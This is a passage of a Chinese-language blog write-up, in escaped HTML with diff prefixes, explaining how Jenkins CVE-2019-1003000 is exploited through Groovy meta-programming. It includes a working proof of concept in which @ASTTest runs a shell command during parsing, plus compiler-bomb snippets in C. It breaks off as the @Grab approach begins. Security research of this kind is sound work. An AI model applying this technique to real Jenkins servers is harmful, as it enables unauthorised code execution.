+&lt;p&gt;要解釋這次的漏洞 &lt;a href=&quot;https://jenkins.io/security/advisory/2019-01-08/#SECURITY-1266&quot;&gt;CVE-2019-1003000&lt;/a&gt; 必須要從 Pipeline 開始講起! 大部分開發者會選擇 Jenkins 作為 CI/CD 伺服器的其中一個原因是因為 Jenkins 提供了一個很強大的 Pipeline 功能，使開發者可以方便的去撰寫一些 Build Script 以完成自動化的編譯、測試及發佈! 你可以想像 Pipeline 就是一個小小的微語言可以去對 Jenkins 進行操作(而實際上 Pipeline 是基於 Groovy 的一個 DSL)&lt;/p&gt;
+
+&lt;p&gt;為了檢查使用者所撰寫的 Pipeline Script 有沒有語法上的錯誤(Syntax Error)，Jenkins 提供了一個介面給使用者檢查自己的 Pipeline! 這裡你可以想像一下，如果你是程式設計師，你要如何去完成這個功能呢? 你可以自己實現一個語法樹(AST, Abstract Syntax Tree)解析器去完成這件事，不過這太累了，最簡單的方式當然是套用現成的東西!&lt;/p&gt;
+
+&lt;p&gt;前面提到，Pipeline 是基於 Groovy 所實現的一個 DSL，所以 Pipeline 必定也遵守著 Groovy 的語法! 所以最簡單的方式是，只要 Groovy 可以成功解析(parse)，那就代表這份 Pipeline 的語法一定是對的! Jenkins 實作檢查的程式碼約是下面這樣子:&lt;/p&gt;
+
+&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;JSON&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;doCheckScriptCompile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nd&quot;&gt;@QueryParameter&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;CpsGroovyShell&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;trusted&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CpsGroovyShellFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;forTrusted&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;build&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;CpsGroovyShellFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;withParent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;trusted&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;build&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getClassLoader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;parseClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CompilationFailedException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;JSONArray&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;fromObject&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CpsFlowDefinitionValidator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toCheckStatus&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toArray&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CpsFlowDefinitionValidator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;CheckStatus&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;SUCCESS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;asJSON&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;// Approval requirements are managed by regular stapler form validation (via doCheckScript)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;這裡使用了 &lt;a href=&quot;http://docs.groovy-lang.org/latest/html/api/groovy/lang/GroovyClassLoader.html#parseClass-java.lang.String-&quot;&gt;GroovyClassLoader.parseClass(…)&lt;/a&gt; 去完成 Groovy 語法的解析! 值得注意的是，由於這只是一個 AST 的解析，在沒有執行 &lt;code class=&quot;highlighter-rouge&quot;&gt;execute()&lt;/code&gt; 的方法前，任何危險的操作是不會被執行的，例如嘗試去解析這段 Groovy 代碼會發現其實什麼事都沒發生 :(&lt;/p&gt;
+
+&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;classLoader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;parseClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;&#39;&#39;
+print java.lang.Runtime.getRuntime().exec(&quot;id&quot;)
+&#39;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;從程式開發者的角度來看，Pipeline 可以操作 Jenkins 那一定很危險，因此要用嚴格的權限保護住! 但這只是一段簡單的語法錯誤檢查，而且呼叫到的地方很多，限制太嚴格的權限只會讓自己綁手綁腳的!&lt;/p&gt;
+
+&lt;p&gt;上面的觀點聽起來很合理，就只是一個 AST 的解析而且沒有任何 &lt;code class=&quot;highlighter-rouge&quot;&gt;execute()&lt;/code&gt; 方法應該很安全，但恰巧這裡就成為了我們第一個入口點! 其實第一次看到這段代碼時，也想不出什麼利用方法就先跳過了，直到要開始撰寫技術文章重新溫習了一次，我想起了說不定 Meta-Programming 會有搞頭!&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;什麼是-meta-programming&quot;&gt;什麼是 Meta-Programming&lt;/h2&gt;
+&lt;hr /&gt;
+
+&lt;p&gt;首先我們來解釋一下什麼是 Meta-Programming!&lt;/p&gt;
+
+&lt;p&gt;Meta-Programming 是一種程式設計的思維! Meta-Programming 的精髓在於提供了一個抽象層次給開發者用另外一種思維去撰寫更高靈活度及更高開發效率的代碼。其實 Meta-Programming 並沒有一個很嚴謹的定義，例如使用程式語言編譯所留下的 Metadata 去動態的產生程式碼，或是把程式自身當成資料，透過編譯器(compiler)或是直譯器(interpreter)去撰寫代碼都可以被說是一種 Meta-Programming! 而其中的哲學其實非常廣泛甚至已經可以被當成程式語言的一個章節來獨立探討!&lt;/p&gt;
+
+&lt;p&gt;大部分的文章或是書籍在解釋 Meta-Programming 的時候通常會這樣解釋:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;用程式碼(code)產生程式碼(code)&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;如果還是很難理解，你可以想像程式語言中的 &lt;code class=&quot;highlighter-rouge&quot;&gt;eval(...)&lt;/code&gt; 其實就是一種廣義上的 Meta-Programming! 雖然不甚精確，但用這個比喻可以快速的理解 Meta-Programming! 其實就是用程式碼(eval 這個函數)去產生程式碼(eval 出來的函數)! 在程式開發上，Meta-Programming 也有著極其多的應用，例如:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;C 語言中的 Macro&lt;/li&gt;
+  &lt;li&gt;C++ 的 Template&lt;/li&gt;
+  &lt;li&gt;Ruby (Ruby 本身就是一門將 Meta-Programming 發揮到極致的語言，甚至還有專門的&lt;a href=&quot;http://shop.oreilly.com/product/9781934356470.do&quot;&gt;書1&lt;/a&gt;, &lt;a href=&quot;http://shop.oreilly.com/product/9781941222126.do&quot;&gt;書2&lt;/a&gt;)&lt;/li&gt;
+  &lt;li&gt;Java 的 Annotation 註解&lt;/li&gt;
+  &lt;li&gt;各種 DSL(Domain Specific Language) 應用，例如 &lt;a href=&quot;http://sinatrarb.com/&quot;&gt;Sinatra&lt;/a&gt; 及 &lt;a href=&quot;https://gradle.org/&quot;&gt;Gradle&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;而當我們在談論 Meta-Programming 時，依照作用的範圍我們大致分成 &lt;strong&gt;(1)編譯時期&lt;/strong&gt; 及 &lt;strong&gt;(2)執行時期&lt;/strong&gt;這兩種 Meta-Programming! 而我們今天的重點，就是在編譯時期的 Meta-Programming!&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;P.S. 我也不是一位 Programming Language 大師，如有不精確或者覺得教壞小朋友的地方再請多多包涵 &amp;lt;(_ _)&amp;gt;&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;如何利用&quot;&gt;如何利用&lt;/h2&gt;
+&lt;hr /&gt;
+
+&lt;p&gt;從前面的段落中我們發現 Jenkins 使用 &lt;a href=&quot;http://docs.groovy-lang.org/latest/html/api/groovy/lang/GroovyClassLoader.html#parseClass-java.lang.String-&quot;&gt;parseClass(…)&lt;/a&gt; 去檢查語法錯誤，我們也想起了 Meta-Programming 可在編譯時期對程式碼做一些動態的操作! 設計一個編譯器(或解析器)是一件很麻煩的事情，裡面會有各種骯髒的實作或是奇怪的功能，所以一個很直覺的想法就是，是否可以透過編譯器一些副作用(Side Effect)去完成一些事情呢?&lt;/p&gt;
+
+&lt;p&gt;舉幾個淺顯易懂的例子，如 C 語言巨集擴展所造成的資源耗盡&lt;/p&gt;
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#define a 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1
+#define b a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a
+#define c b,b,b,b,b,b,b,b,b,b,b,b,b,b,b,b
+#define d c,c,c,c,c,c,c,c,c,c,c,c,c,c,c,c
+#define e d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d
+#define f e,e,e,e,e,e,e,e,e,e,e,e,e,e,e,e
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__int128&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;編譯器的資源耗盡(用 18 bytes 產生 16G 的執行檔)&lt;/p&gt;
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;或是用編譯器來幫你算費式數列&lt;/p&gt;
+
+&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;template&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;template&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;template&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 55&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 6765&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 102334155&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;從組合語言的結果可以看出這些值在編譯期間就被計算好填充進去，而不是執行期間!&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;g++ template.cpp &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; template
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;objdump &lt;span class=&quot;nt&quot;&gt;-M&lt;/span&gt; intel &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; template
+...
+00000000000005fa &amp;lt;main&amp;gt;:
+ 5fa:   55                      push   rbp
+ 5fb:   48 89 e5                mov    rbp,rsp
+ 5fe:   c7 45 f4 37 00 00 00    mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0xc],0x37
+ 605:   c7 45 f8 6d 1a 00 00    mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0x8],0x1a6d
+ 60c:   c7 45 &lt;span class=&quot;nb&quot;&gt;fc &lt;/span&gt;cb 7e 19 06    mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0x4],0x6197ecb
+ 613:   b8 00 00 00 00          mov    eax,0x0
+ 618:   5d                      pop    rbp
+ 619:   c3                      ret
+ 61a:   66 0f 1f 44 00 00       nop    WORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rax+rax&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;1+0x0]
+...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;更多的例子你可以參考 StackOverflow 上的 &lt;a href=&quot;https://codegolf.stackexchange.com/questions/69189/build-a-compiler-bomb&quot;&gt;Build a Compiler Bomb&lt;/a&gt; 這篇文章!&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;首次嘗試&quot;&gt;首次嘗試&lt;/h3&gt;
+&lt;hr /&gt;
+
+&lt;p&gt;回到我們的漏洞利用上，Pipeline 是基於 Groovy 上的一個 DSL 實作，而 Groovy 剛好就是一門對於 Meta-Programming 非常友善的語言! 翻閱著 Grovvy 官方的 &lt;a href=&quot;http://groovy-lang.org/metaprogramming.html&quot;&gt;Meta-Programming 手冊&lt;/a&gt; 開始尋找各種可以利用的方法! 在 2.1.9 章「測試協助」這個段落發現了 &lt;code class=&quot;highlighter-rouge&quot;&gt;@groovy.transform.ASTTest&lt;/code&gt; 這個註解，仔細觀察它的敘述:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;@ASTTest&lt;/code&gt; is a special AST transformation meant to help debugging other AST transformations or the Groovy compiler itself. It will let the developer “explore” the AST during compilation and &lt;strong&gt;perform assertions on the AST&lt;/strong&gt; rather than on the result of compilation. This means that this AST transformations gives access to the AST before the bytecode is produced. &lt;code class=&quot;highlighter-rouge&quot;&gt;@ASTTest&lt;/code&gt; can be placed on any annotable node and requires two parameters:&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;什麼! 可以在 AST 上執行一個 assertion? 這不就是我們要的嗎? 趕緊先在本地寫個 Proof-of-Concept 嘗試是否可行:&lt;/p&gt;
+
+&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;classLoader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;parseClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;&#39;&#39;
+@groovy.transform.ASTTest(value={
+    assert java.lang.Runtime.getRuntime().exec(&quot;touch pwned&quot;)
+})
+def x
+&#39;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
+&lt;/span&gt;poc.groovy
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;groovy poc.groovy
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
+&lt;/span&gt;poc.groovy  pwned
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;幹，可以欸! 但代誌並不是憨人想的那麼簡單! 嘗試在遠端 Jenkins 重現時，出現了:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;unable to resolve class org.jenkinsci.plugins.workflow.libs.Library&lt;/p&gt;
+
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190219/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;真是黑人問號，森77，這到底是三小啦!!!&lt;/p&gt;
+
+&lt;p&gt;認真追了一下 root cause 才發現是 &lt;a href=&quot;https://wiki.jenkins.io/display/JENKINS/Pipeline+Shared+Groovy+Libraries+Plugin&quot;&gt;Pipeline Shared Groovy Libraries Plugin&lt;/a&gt; 這個插件在作怪! 為了方便使用者可重複使用在編寫 Pipeline 常用到的功能，Jenkins 提供了這個插件可在 Pipeline 中引入自定義的函式庫! Jenkins 會在所有 Pipeline 執行前引入這個函式庫，而在編譯時期的 classPath 中並沒有相對應的函式庫因而導致了這個錯誤!&lt;/p&gt;
+
+&lt;p&gt;想解決這個問題很簡單，到 &lt;a href=&quot;http://jenkins.local/pluginManager/&quot;&gt;Jenkins Plugin Manager&lt;/a&gt; 中將 &lt;a href=&quot;https://wiki.jenkins.io/display/JENKINS/Pipeline+Shared+Groovy+Libraries+Plugin&quot;&gt;Pipeline Shared Groovy Libraries Plugin&lt;/a&gt; 移除即可解決這個問題並執行任意代碼!&lt;/p&gt;
+
+&lt;p&gt;不過這絕對不是最佳解! 這個插件會隨著 Pipeline 被自動安裝，為了要成功利用這個漏洞還得先要求管理員把它移除實在太蠢了! 因此這條路只能先打住，繼續尋找下一個方法!&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;再次嘗試&quot;&gt;再次嘗試&lt;/h3&gt;
+&lt;hr /&gt;
+
+&lt;p&gt;繼續閱讀 &lt;a href=&quot;http://groovy-lang.org/metaprogramming.html&quot;&gt;Groovy Meta-Programming 手冊&lt;/a&gt;，我們發現了另一個有趣的註解 &lt;code class=&quot;highlighter-rouge&quot;&gt;@Grab&lt;/code&gt;，關於 &lt;code class=&quot;highlighter-rouge&quot;&gt;@Grab&lt;/code&gt; 手冊中並沒有詳細的描述，但使用 Google 我們發現了另一篇文章 - &lt;a href=&quot;http://docs.groovy-lang.org/latest/html/documentation/grape.html&quot;&gt;Dependency management with Grape&lt;/a&gt;!&lt;/p&gt;
+
